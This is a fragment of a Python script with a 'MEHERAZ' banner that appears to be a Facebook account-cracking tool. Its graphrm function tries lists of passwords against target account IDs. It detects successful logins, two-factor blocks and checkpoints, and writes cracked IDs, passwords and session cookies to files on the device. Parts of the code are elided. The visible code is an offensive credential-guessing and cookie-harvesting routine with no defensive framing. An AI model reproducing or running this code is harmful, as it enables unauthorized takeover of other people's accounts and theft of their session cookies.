...
===========================▶︎
  __  __ ______ _    _ ______ _____             ______
 |  \/  |  ____| |  | |  ____|  __ \     /\    |___  /
 | \  / | |__  | |__| | |__  | |__) |   /  \      / / 
 | |\/| |  __| |  __  |  __| |  _  /   / /\ \    / /  
 | |  | | |____| |  | | |____| | \ \  / ____ \  / /__ 
 |_|  |_|______|_|  |_|______|_|  \_\/_/    \_\/_____|
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}MEHERAZ{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}MEHERAZ-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/SAFWAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🌺{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[MEHERAZ-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/EHC-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[MEHERAZ] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/𝟮𝟭/𝘿𝘾𝙀-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
